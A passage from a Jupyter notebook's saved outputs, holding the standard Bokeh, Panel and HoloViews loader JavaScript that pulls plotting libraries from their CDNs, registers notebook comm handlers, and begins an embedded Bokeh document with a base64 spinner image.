'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/tooltip/jspanel.tooltip', 'jspanel-hint': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/hint/jspanel.hint', 'jspanel-layout': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/layout/jspanel.layout', 'jspanel-contextmenu': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/contextmenu/jspanel.contextmenu', 'jspanel-dock': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/dock/jspanel.dock', 'gridstack': 'https://cdn.jsdelivr.net/npm/gridstack@7.2.3/dist/gridstack-all', 'notyf': 'https://cdn.jsdelivr.net/npm/notyf@3/notyf.min'}, 'shim': {'jspanel': {'exports': 'jsPanel'}, 'gridstack': {'exports': 'GridStack'}}});\n      require([\"jspanel\"], function(jsPanel) {\n\twindow.jsPanel = jsPanel\n\ton_load()\n      })\n      require([\"jspanel-modal\"], function() {\n\ton_load()\n      })\n      require([\"jspanel-tooltip\"], function() {\n\ton_load()\n      })\n      require([\"jspanel-hint\"], function() {\n\ton_load()\n      })\n      require([\"jspanel-layout\"], function() {\n\ton_load()\n      })\n      require([\"jspanel-contextmenu\"], function() {\n\ton_load()\n      })\n      require([\"jspanel-dock\"], function() {\n\ton_load()\n      })\n      require([\"gridstack\"], function(GridStack) {\n\twindow.GridStack = GridStack\n\ton_load()\n      })\n      require([\"notyf\"], function() {\n\ton_load()\n      })\n      root._bokeh_is_loading = css_urls.length + 9;\n    } else {\n      root._bokeh_is_loading = css_urls.length + js_urls.length + js_modules.length + Object.keys(js_exports).length;\n    }\n\n    var existing_stylesheets = []\n    var links = document.getElementsByTagName('link')\n    for (var i = 0; i < links.length; i++) {\n      var link = links[i]\n      if (link.href != null) {\n\texisting_stylesheets.push(link.href)\n      }\n    }\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      if (existing_stylesheets.indexOf(url) !== -1) {\n\ton_load()\n\tcontinue;\n      }\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }    if (((window['jsPanel'] !== undefined) && (!(window['jsPanel'] instanceof HTMLElement))) || window.requirejs) {\n      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/jspanel.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/modal/jspanel.modal.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/tooltip/jspanel.tooltip.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/hint/jspanel.hint.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/layout/jspanel.layout.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/contextmenu/jspanel.contextmenu.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/dock/jspanel.dock.js'];\n      for (var i = 0; i < urls.length; i++) {\n        skip.push(urls[i])\n      }\n    }    if (((window['GridStack'] !== undefined) && (!(window['GridStack'] instanceof HTMLElement))) || window.requirejs) {\n      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/gridstack/gridstack@7.2.3/dist/gridstack-all.js'];\n      for (var i = 0; i < urls.length; i++) {\n        skip.push(urls[i])\n      }\n    }    if (((window['Notyf'] !== undefined) && (!(window['Notyf'] instanceof HTMLElement))) || window.requirejs) {\n      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/notificationarea/notyf@3/notyf.min.js'];\n      for (var i = 0; i < urls.length; i++) {\n        skip.push(urls[i])\n      }\n    }    var existing_scripts = []\n    var scripts = document.getElementsByTagName('script')\n    for (var i = 0; i < scripts.length; i++) {\n      var script = scripts[i]\n      if (script.src != null) {\n\texisting_scripts.push(script.src)\n      }\n    }\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      if (skip.indexOf(url) !== -1 || existing_scripts.indexOf(url) !== -1) {\n\tif (!window.requirejs) {\n\t  on_load();\n\t}\n\tcontinue;\n      }\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n    for (var i = 0; i < js_modules.length; i++) {\n      var url = js_modules[i];\n      if (skip.indexOf(url) !== -1 || existing_scripts.indexOf(url) !== -1) {\n\tif (!window.requirejs) {\n\t  on_load();\n\t}\n\tcontinue;\n      }\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      element.type = \"module\";\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n    for (const name in js_exports) {\n      var url = js_exports[name];\n      if (skip.indexOf(url) >= 0 || root[name] != null) {\n\tif (!window.requirejs) {\n\t  on_load();\n\t}\n\tcontinue;\n      }\n      var element = document.createElement('script');\n      element.onerror = on_error;\n      element.async = false;\n      element.type = \"module\";\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      element.textContent = `\n      import ${name} from \"${url}\"\n      window.${name} = ${name}\n      window._bokeh_on_load()\n      `\n      document.head.appendChild(element);\n    }\n    if (!js_urls.length && !js_modules.length) {\n      on_load()\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.2.1.min.js\", \"https://cdn.holoviz.org/panel/1.2.1/dist/panel.min.js\"];\n  var js_modules = [];\n  var js_exports = {};\n  var css_urls = [];\n  var inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {} // ensure no trailing comma for IE\n  ];\n\n  function run_inline_js() {\n    if ((root.Bokeh !== undefined) || (force === true)) {\n      for (var i = 0; i < inline_js.length; i++) {\n        inline_js[i].call(root, root.Bokeh);\n      }\n      // Cache old bokeh versions\n      if (Bokeh != undefined && !reloading) {\n\tvar NewBokeh = root.Bokeh;\n\tif (Bokeh.versions === undefined) {\n\t  Bokeh.versions = new Map();\n\t}\n\tif (NewBokeh.version !== Bokeh.version) {\n\t  Bokeh.versions.set(NewBokeh.version, NewBokeh)\n\t}\n\troot.Bokeh = Bokeh;\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    }\n    root._bokeh_is_initializing = false\n  }\n\n  function load_or_wait() {\n    // Implement a backoff loop that tries to ensure we do not load multiple\n    // versions of Bokeh and its dependencies at the same time.\n    // In recent versions we use the root._bokeh_is_initializing flag\n    // to determine whether there is an ongoing attempt to initialize\n    // bokeh, however for backward compatibility we also try to ensure\n    // that we do not start loading a newer (Panel>=1.0 and Bokeh>3) version\n    // before older versions are fully initialized.\n    if (root._bokeh_is_initializing && Date.now() > root._bokeh_timeout) {\n      root._bokeh_is_initializing = false;\n      root._bokeh_onload_callbacks = undefined;\n      console.log(\"Bokeh: BokehJS was loaded multiple times but one version failed to initialize.\");\n      load_or_wait();\n    } else if (root._bokeh_is_initializing || (typeof root._bokeh_is_initializing === \"undefined\" && root._bokeh_onload_callbacks !== undefined)) {\n      setTimeout(load_or_wait, 100);\n    } else {\n      Bokeh = root.Bokeh;\n      bokeh_loaded = Bokeh != null && (Bokeh.version === py_version || (Bokeh.versions !== undefined && Bokeh.versions.has(py_version)));\n      root._bokeh_is_initializing = true\n      root._bokeh_onload_callbacks = []\n      if (!reloading && (!bokeh_loaded || is_dev)) {\n\troot.Bokeh = undefined;\n      }\n      load_libs(css_urls, js_urls, js_modules, js_exports, function() {\n\tconsole.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n\trun_inline_js();\n      });\n    }\n  }\n  // Give older versions of the autoload script a head-start to ensure\n  // they initialize before we start loading newer version.\n  setTimeout(load_or_wait, 100)\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "if ((window.PyViz === undefined) || (window.PyViz instanceof HTMLElement)) {\n",
       "  window.PyViz = {comms: {}, comm_status:{}, kernels:{}, receivers: {}, plot_index: []}\n",
       "}\n",
       "\n",
       "\n",
       "    function JupyterCommManager() {\n",
       "    }\n",
       "\n",
       "    JupyterCommManager.prototype.register_target = function(plot_id, comm_id, msg_handler) {\n",
       "      if (window.comm_manager || ((window.Jupyter !== undefined) && (Jupyter.notebook.kernel != null))) {\n",
       "        var comm_manager = window.comm_manager || Jupyter.notebook.kernel.comm_manager;\n",
       "        comm_manager.register_target(comm_id, function(comm) {\n",
       "          comm.on_msg(msg_handler);\n",
       "        });\n",
       "      } else if ((plot_id in window.PyViz.kernels) && (window.PyViz.kernels[plot_id])) {\n",
       "        window.PyViz.kernels[plot_id].registerCommTarget(comm_id, function(comm) {\n",
       "          comm.onMsg = msg_handler;\n",
       "        });\n",
       "      } else if (typeof google != 'undefined' && google.colab.kernel != null) {\n",
       "        google.colab.kernel.comms.registerTarget(comm_id, (comm) => {\n",
       "          var messages = comm.messages[Symbol.asyncIterator]();\n",
       "          function processIteratorResult(result) {\n",
       "            var message = result.value;\n",
       "            console.log(message)\n",
       "            var content = {data: message.data, comm_id};\n",
       "            var buffers = []\n",
       "            for (var buffer of message.buffers || []) {\n",
       "              buffers.push(new DataView(buffer))\n",
       "            }\n",
       "            var metadata = message.metadata || {};\n",
       "            var msg = {content, buffers, metadata}\n",
       "            msg_handler(msg);\n",
       "            return messages.next().then(processIteratorResult);\n",
       "          }\n",
       "          return messages.next().then(processIteratorResult);\n",
       "        })\n",
       "      }\n",
       "    }\n",
       "\n",
       "    JupyterCommManager.prototype.get_client_comm = function(plot_id, comm_id, msg_handler) {\n",
       "      if (comm_id in window.PyViz.comms) {\n",
       "        return window.PyViz.comms[comm_id];\n",
       "      } else if (window.comm_manager || ((window.Jupyter !== undefined) && (Jupyter.notebook.kernel != null))) {\n",
       "        var comm_manager = window.comm_manager || Jupyter.notebook.kernel.comm_manager;\n",
       "        var comm = comm_manager.new_comm(comm_id, {}, {}, {}, comm_id);\n",
       "        if (msg_handler) {\n",
       "          comm.on_msg(msg_handler);\n",
       "        }\n",
       "      } else if ((plot_id in window.PyViz.kernels) && (window.PyViz.kernels[plot_id])) {\n",
       "        var comm = window.PyViz.kernels[plot_id].connectToComm(comm_id);\n",
       "        comm.open();\n",
       "        if (msg_handler) {\n",
       "          comm.onMsg = msg_handler;\n",
       "        }\n",
       "      } else if (typeof google != 'undefined' && google.colab.kernel != null) {\n",
       "        var comm_promise = google.colab.kernel.comms.open(comm_id)\n",
       "        comm_promise.then((comm) => {\n",
       "          window.PyViz.comms[comm_id] = comm;\n",
       "          if (msg_handler) {\n",
       "            var messages = comm.messages[Symbol.asyncIterator]();\n",
       "            function processIteratorResult(result) {\n",
       "              var message = result.value;\n",
       "              var content = {data: message.data};\n",
       "              var metadata = message.metadata || {comm_id};\n",
       "              var msg = {content, metadata}\n",
       "              msg_handler(msg);\n",
       "              return messages.next().then(processIteratorResult);\n",
       "            }\n",
       "            return messages.next().then(processIteratorResult);\n",
       "          }\n",
       "        }) \n",
       "        var sendClosure = (data, metadata, buffers, disposeOnDone) => {\n",
       "          return comm_promise.then((comm) => {\n",
       "            comm.send(data, metadata, buffers, disposeOnDone);\n",
       "          });\n",
       "        };\n",
       "        var comm = {\n",
       "          send: sendClosure\n",
       "        };\n",
       "      }\n",
       "      window.PyViz.comms[comm_id] = comm;\n",
       "      return comm;\n",
       "    }\n",
       "    window.PyViz.comm_manager = new JupyterCommManager();\n",
       "    \n",
       "\n",
       "\n",
       "var JS_MIME_TYPE = 'application/javascript';\n",
       "var HTML_MIME_TYPE = 'text/html';\n",
       "var EXEC_MIME_TYPE = 'application/vnd.holoviews_exec.v0+json';\n",
       "var CLASS_NAME = 'output';\n",
       "\n",
       "/**\n",
       " * Render data to the DOM node\n",
       " */\n",
       "function render(props, node) {\n",
       "  var div = document.createElement(\"div\");\n",
       "  var script = document.createElement(\"script\");\n",
       "  node.appendChild(div);\n",
       "  node.appendChild(script);\n",
       "}\n",
       "\n",
       "/**\n",
       " * Handle when a new output is added\n",
       " */\n",
       "function handle_add_output(event, handle) {\n",
       "  var output_area = handle.output_area;\n",
       "  var output = handle.output;\n",
       "  if ((output.data == undefined) || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "    return\n",
       "  }\n",
       "  var id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "  var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "  if (id !== undefined) {\n",
       "    var nchildren = toinsert.length;\n",
       "    var html_node = toinsert[nchildren-1].children[0];\n",
       "    html_node.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "    var scripts = [];\n",
       "    var nodelist = html_node.querySelectorAll(\"script\");\n",
       "    for (var i in nodelist) {\n",
       "      if (nodelist.hasOwnProperty(i)) {\n",
       "        scripts.push(nodelist[i])\n",
       "      }\n",
       "    }\n",
       "\n",
       "    scripts.forEach( function (oldScript) {\n",
       "      var newScript = document.createElement(\"script\");\n",
       "      var attrs = [];\n",
       "      var nodemap = oldScript.attributes;\n",
       "      for (var j in nodemap) {\n",
       "        if (nodemap.hasOwnProperty(j)) {\n",
       "          attrs.push(nodemap[j])\n",
       "        }\n",
       "      }\n",
       "      attrs.forEach(function(attr) { newScript.setAttribute(attr.name, attr.value) });\n",
       "      newScript.appendChild(document.createTextNode(oldScript.innerHTML));\n",
       "      oldScript.parentNode.replaceChild(newScript, oldScript);\n",
       "    });\n",
       "    if (JS_MIME_TYPE in output.data) {\n",
       "      toinsert[nchildren-1].children[1].textContent = output.data[JS_MIME_TYPE];\n",
       "    }\n",
       "    output_area._hv_plot_id = id;\n",
       "    if ((window.Bokeh !== undefined) && (id in Bokeh.index)) {\n",
       "      window.PyViz.plot_index[id] = Bokeh.index[id];\n",
       "    } else {\n",
       "      window.PyViz.plot_index[id] = null;\n",
       "    }\n",
       "  } else if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "    var bk_div = document.createElement(\"div\");\n",
       "    bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "    var script_attrs = bk_div.children[0].attributes;\n",
       "    for (var i = 0; i < script_attrs.length; i++) {\n",
       "      toinsert[toinsert.length - 1].childNodes[1].setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "    }\n",
       "    // store reference to server id on output_area\n",
       "    output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "  }\n",
       "}\n",
       "\n",
       "/**\n",
       " * Handle when an output is cleared or removed\n",
       " */\n",
       "function handle_clear_output(event, handle) {\n",
       "  var id = handle.cell.output_area._hv_plot_id;\n",
       "  var server_id = handle.cell.output_area._bokeh_server_id;\n",
       "  if (((id === undefined) || !(id in PyViz.plot_index)) && (server_id !== undefined)) { return; }\n",
       "  var comm = window.PyViz.comm_manager.get_client_comm(\"hv-extension-comm\", \"hv-extension-comm\", function () {});\n",
       "  if (server_id !== null) {\n",
       "    comm.send({event_type: 'server_delete', 'id': server_id});\n",
       "    return;\n",
       "  } else if (comm !== null) {\n",
       "    comm.send({event_type: 'delete', 'id': id});\n",
       "  }\n",
       "  delete PyViz.plot_index[id];\n",
       "  if ((window.Bokeh !== undefined) & (id in window.Bokeh.index)) {\n",
       "    var doc = window.Bokeh.index[id].model.document\n",
       "    doc.clear();\n",
       "    const i = window.Bokeh.documents.indexOf(doc);\n",
       "    if (i > -1) {\n",
       "      window.Bokeh.documents.splice(i, 1);\n",
       "    }\n",
       "  }\n",
       "}\n",
       "\n",
       "/**\n",
       " * Handle kernel restart event\n",
       " */\n",
       "function handle_kernel_cleanup(event, handle) {\n",
       "  delete PyViz.comms[\"hv-extension-comm\"];\n",
       "  window.PyViz.plot_index = {}\n",
       "}\n",
       "\n",
       "/**\n",
       " * Handle update_display_data messages\n",
       " */\n",
       "function handle_update_output(event, handle) {\n",
       "  handle_clear_output(event, {cell: {output_area: handle.output_area}})\n",
       "  handle_add_output(event, handle)\n",
       "}\n",
       "\n",
       "function register_renderer(events, OutputArea) {\n",
       "  function append_mime(data, metadata, element) {\n",
       "    // create a DOM node to render to\n",
       "    var toinsert = this.create_output_subarea(\n",
       "    metadata,\n",
       "    CLASS_NAME,\n",
       "    EXEC_MIME_TYPE\n",
       "    );\n",
       "    this.keyboard_manager.register_events(toinsert);\n",
       "    // Render to node\n",
       "    var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "    render(props, toinsert[0]);\n",
       "    element.append(toinsert);\n",
       "    return toinsert\n",
       "  }\n",
       "\n",
       "  events.on('output_added.OutputArea', handle_add_output);\n",
       "  events.on('output_updated.OutputArea', handle_update_output);\n",
       "  events.on('clear_output.CodeCell', handle_clear_output);\n",
       "  events.on('delete.Cell', handle_clear_output);\n",
       "  events.on('kernel_ready.Kernel', handle_kernel_cleanup);\n",
       "\n",
       "  OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "    safe: true,\n",
       "    index: 0\n",
       "  });\n",
       "}\n",
       "\n",
       "if (window.Jupyter !== undefined) {\n",
       "  try {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  } catch(err) {\n",
       "  }\n",
       "}\n"
      ],
      "application/vnd.holoviews_load.v0+json": "\nif ((window.PyViz === undefined) || (window.PyViz instanceof HTMLElement)) {\n  window.PyViz = {comms: {}, comm_status:{}, kernels:{}, receivers: {}, plot_index: []}\n}\n\n\n    function JupyterCommManager() {\n    }\n\n    JupyterCommManager.prototype.register_target = function(plot_id, comm_id, msg_handler) {\n      if (window.comm_manager || ((window.Jupyter !== undefined) && (Jupyter.notebook.kernel != null))) {\n        var comm_manager = window.comm_manager || Jupyter.notebook.kernel.comm_manager;\n        comm_manager.register_target(comm_id, function(comm) {\n          comm.on_msg(msg_handler);\n        });\n      } else if ((plot_id in window.PyViz.kernels) && (window.PyViz.kernels[plot_id])) {\n        window.PyViz.kernels[plot_id].registerCommTarget(comm_id, function(comm) {\n          comm.onMsg = msg_handler;\n        });\n      } else if (typeof google != 'undefined' && google.colab.kernel != null) {\n        google.colab.kernel.comms.registerTarget(comm_id, (comm) => {\n          var messages = comm.messages[Symbol.asyncIterator]();\n          function processIteratorResult(result) {\n            var message = result.value;\n            console.log(message)\n            var content = {data: message.data, comm_id};\n            var buffers = []\n            for (var buffer of message.buffers || []) {\n              buffers.push(new DataView(buffer))\n            }\n            var metadata = message.metadata || {};\n            var msg = {content, buffers, metadata}\n            msg_handler(msg);\n            return messages.next().then(processIteratorResult);\n          }\n          return messages.next().then(processIteratorResult);\n        })\n      }\n    }\n\n    JupyterCommManager.prototype.get_client_comm = function(plot_id, comm_id, msg_handler) {\n      if (comm_id in window.PyViz.comms) {\n        return window.PyViz.comms[comm_id];\n      } else if (window.comm_manager || ((window.Jupyter !== undefined) && (Jupyter.notebook.kernel != null))) {\n        var comm_manager = window.comm_manager || Jupyter.notebook.kernel.comm_manager;\n        var comm = comm_manager.new_comm(comm_id, {}, {}, {}, comm_id);\n        if (msg_handler) {\n          comm.on_msg(msg_handler);\n        }\n      } else if ((plot_id in window.PyViz.kernels) && (window.PyViz.kernels[plot_id])) {\n        var comm = window.PyViz.kernels[plot_id].connectToComm(comm_id);\n        comm.open();\n        if (msg_handler) {\n          comm.onMsg = msg_handler;\n        }\n      } else if (typeof google != 'undefined' && google.colab.kernel != null) {\n        var comm_promise = google.colab.kernel.comms.open(comm_id)\n        comm_promise.then((comm) => {\n          window.PyViz.comms[comm_id] = comm;\n          if (msg_handler) {\n            var messages = comm.messages[Symbol.asyncIterator]();\n            function processIteratorResult(result) {\n              var message = result.value;\n              var content = {data: message.data};\n              var metadata = message.metadata || {comm_id};\n              var msg = {content, metadata}\n              msg_handler(msg);\n              return messages.next().then(processIteratorResult);\n            }\n            return messages.next().then(processIteratorResult);\n          }\n        }) \n        var sendClosure = (data, metadata, buffers, disposeOnDone) => {\n          return comm_promise.then((comm) => {\n            comm.send(data, metadata, buffers, disposeOnDone);\n          });\n        };\n        var comm = {\n          send: sendClosure\n        };\n      }\n      window.PyViz.comms[comm_id] = comm;\n      return comm;\n    }\n    window.PyViz.comm_manager = new JupyterCommManager();\n    \n\n\nvar JS_MIME_TYPE = 'application/javascript';\nvar HTML_MIME_TYPE = 'text/html';\nvar EXEC_MIME_TYPE = 'application/vnd.holoviews_exec.v0+json';\nvar CLASS_NAME = 'output';\n\n/**\n * Render data to the DOM node\n */\nfunction render(props, node) {\n  var div = document.createElement(\"div\");\n  var script = document.createElement(\"script\");\n  node.appendChild(div);\n  node.appendChild(script);\n}\n\n/**\n * Handle when a new output is added\n */\nfunction handle_add_output(event, handle) {\n  var output_area = handle.output_area;\n  var output = handle.output;\n  if ((output.data == undefined) || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n    return\n  }\n  var id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n  var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n  if (id !== undefined) {\n    var nchildren = toinsert.length;\n    var html_node = toinsert[nchildren-1].children[0];\n    html_node.innerHTML = output.data[HTML_MIME_TYPE];\n    var scripts = [];\n    var nodelist = html_node.querySelectorAll(\"script\");\n    for (var i in nodelist) {\n      if (nodelist.hasOwnProperty(i)) {\n        scripts.push(nodelist[i])\n      }\n    }\n\n    scripts.forEach( function (oldScript) {\n      var newScript = document.createElement(\"script\");\n      var attrs = [];\n      var nodemap = oldScript.attributes;\n      for (var j in nodemap) {\n        if (nodemap.hasOwnProperty(j)) {\n          attrs.push(nodemap[j])\n        }\n      }\n      attrs.forEach(function(attr) { newScript.setAttribute(attr.name, attr.value) });\n      newScript.appendChild(document.createTextNode(oldScript.innerHTML));\n      oldScript.parentNode.replaceChild(newScript, oldScript);\n    });\n    if (JS_MIME_TYPE in output.data) {\n      toinsert[nchildren-1].children[1].textContent = output.data[JS_MIME_TYPE];\n    }\n    output_area._hv_plot_id = id;\n    if ((window.Bokeh !== undefined) && (id in Bokeh.index)) {\n      window.PyViz.plot_index[id] = Bokeh.index[id];\n    } else {\n      window.PyViz.plot_index[id] = null;\n    }\n  } else if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n    var bk_div = document.createElement(\"div\");\n    bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n    var script_attrs = bk_div.children[0].attributes;\n    for (var i = 0; i < script_attrs.length; i++) {\n      toinsert[toinsert.length - 1].childNodes[1].setAttribute(script_attrs[i].name, script_attrs[i].value);\n    }\n    // store reference to server id on output_area\n    output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n  }\n}\n\n/**\n * Handle when an output is cleared or removed\n */\nfunction handle_clear_output(event, handle) {\n  var id = handle.cell.output_area._hv_plot_id;\n  var server_id = handle.cell.output_area._bokeh_server_id;\n  if (((id === undefined) || !(id in PyViz.plot_index)) && (server_id !== undefined)) { return; }\n  var comm = window.PyViz.comm_manager.get_client_comm(\"hv-extension-comm\", \"hv-extension-comm\", function () {});\n  if (server_id !== null) {\n    comm.send({event_type: 'server_delete', 'id': server_id});\n    return;\n  } else if (comm !== null) {\n    comm.send({event_type: 'delete', 'id': id});\n  }\n  delete PyViz.plot_index[id];\n  if ((window.Bokeh !== undefined) & (id in window.Bokeh.index)) {\n    var doc = window.Bokeh.index[id].model.document\n    doc.clear();\n    const i = window.Bokeh.documents.indexOf(doc);\n    if (i > -1) {\n      window.Bokeh.documents.splice(i, 1);\n    }\n  }\n}\n\n/**\n * Handle kernel restart event\n */\nfunction handle_kernel_cleanup(event, handle) {\n  delete PyViz.comms[\"hv-extension-comm\"];\n  window.PyViz.plot_index = {}\n}\n\n/**\n * Handle update_display_data messages\n */\nfunction handle_update_output(event, handle) {\n  handle_clear_output(event, {cell: {output_area: handle.output_area}})\n  handle_add_output(event, handle)\n}\n\nfunction register_renderer(events, OutputArea) {\n  function append_mime(data, metadata, element) {\n    // create a DOM node to render to\n    var toinsert = this.create_output_subarea(\n    metadata,\n    CLASS_NAME,\n    EXEC_MIME_TYPE\n    );\n    this.keyboard_manager.register_events(toinsert);\n    // Render to node\n    var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n    render(props, toinsert[0]);\n    element.append(toinsert);\n    return toinsert\n  }\n\n  events.on('output_added.OutputArea', handle_add_output);\n  events.on('output_updated.OutputArea', handle_update_output);\n  events.on('clear_output.CodeCell', handle_clear_output);\n  events.on('delete.Cell', handle_clear_output);\n  events.on('kernel_ready.Kernel', handle_kernel_cleanup);\n\n  OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n    safe: true,\n    index: 0\n  });\n}\n\nif (window.Jupyter !== undefined) {\n  try {\n    var events = require('base/js/events');\n    var OutputArea = require('notebook/js/outputarea').OutputArea;\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  } catch(err) {\n  }\n}\n"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<style>*[data-root-id],\n",
       "*[data-root-id] > * {\n",
       "  box-sizing: border-box;\n",
       "  font-family: var(--jp-ui-font-family);\n",
       "  font-size: var(--jp-ui-font-size1);\n",
       "  color: var(--vscode-editor-foreground, var(--jp-ui-font-color1));\n",
       "}\n",
       "\n",
       "/* Override VSCode background color */\n",
       ".cell-output-ipywidget-background:has(\n",
       "    > .cell-output-ipywidget-background > .lm-Widget > *[data-root-id]\n",
       "  ),\n",
       ".cell-output-ipywidget-background:has(> .lm-Widget > *[data-root-id]) {\n",
       "  background-color: transparent !important;\n",
       "}\n",
       "</style>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.holoviews_exec.v0+json": "",
      "text/html": [
       "<div id='p1556'>\n",
       "  <div id=\"a59aedfe-eb93-4b49-ae4a-6816f728a002\" data-root-id=\"p1556\" style=\"display: contents;\"></div>\n",
       "</div>\n",
       "<script type=\"application/javascript\">(function(root) {\n",
       "  var docs_json = {\"d97b3c3b-638e-4741-81ce-9814aa90f440\":{\"version\":\"3.2.1\",\"title\":\"Bokeh Application\",\"roots\":[{\"type\":\"object\",\"name\":\"Row\",\"id\":\"p1556\",\"attributes\":{\"name\":\"Row10532\",\"stylesheets\":[\"\\n:host(.pn-loading.pn-arc):before, .pn-loading.pn-arc:before {\\n  background-image: url(\\\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHN0eWxlPSJtYXJnaW46IGF1dG87IGJhY2tncm91bmQ6IG5vbmU7IGRpc3BsYXk6IGJsb2NrOyBzaGFwZS1yZW5kZXJpbmc6IGF1dG87IiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPiAgPGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYzNjM2MzIiBzdHJva2Utd2lkdGg9IjEwIiByPSIzNSIgc3Ryb2tlLWRhc2hhcnJheT0iMTY0LjkzMzYxNDMxMzQ2NDE1IDU2Ljk3Nzg3MTQzNzgyMTM4Ij4gICAgPGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIiBkdXI9IjFzIiB2YWx1ZXM9IjAgNTAgNTA7MzYwIDUwIDUwIiBrZXlUaW1lcz0iMDsxIj48L2FuaW1hdGVUcmFuc2Zvcm0+ICA8L2NpcmNsZT48L3N2Zz4=\\\");\\n  background-size: auto calc(min(50%, 